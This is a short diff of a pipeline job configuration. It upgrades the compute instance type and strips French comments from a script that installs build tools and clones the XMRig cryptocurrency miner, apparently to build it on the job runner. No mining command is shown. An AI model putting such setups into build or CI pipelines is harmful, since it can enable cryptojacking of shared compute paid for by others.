@@ -5,22 +5,18 @@
 jobs:
   Install:
     resources:
-      instance-type: C5
+      instance-type: C7
     outputs:
       repo:
         type: volume
     uses: script@v1
     with:
       script: |
-        # Met à jour la liste des paquets disponibles
         sudo apt-get update -y
         
-        # Met à jour tous les paquets installés vers leur dernière version
         sudo apt-get upgrade -y
         
-        # Installation des dépendances requises pour compiler et exécuter XMRig
         sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
         
-        # Clone du dépôt officiel de XMRig
         git clone https://github.com/xmrig/xmrig.git
       image: 'ubuntu:22.04'
